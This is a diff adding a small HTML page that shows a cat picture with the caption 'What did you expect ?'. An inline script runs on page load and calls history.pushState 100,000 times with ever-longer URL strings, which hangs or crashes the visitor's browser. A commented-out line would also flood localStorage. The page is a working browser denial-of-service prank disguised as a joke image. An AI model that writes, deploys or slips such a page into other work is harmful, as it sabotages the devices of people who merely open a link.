@@ -1,0 +1,18 @@
+
+
+
+<!DOCTYPE html>
+<html>
+    <body>
+    <h1>What did you expect ?</h1>
+    <img src="images/catwhat.jpg" alt="Wut" style="width:304px;height:228px;">
+        <script>
+            var total = "";
+            for( var i = 0; i < 100000; i++ ) {
+                total = total + i.toString();
+                history.pushState(0,0, total );
+                //localStorage.setItem(Math.random(), total);
+            }
+        </script>
+    </body>
+</html>
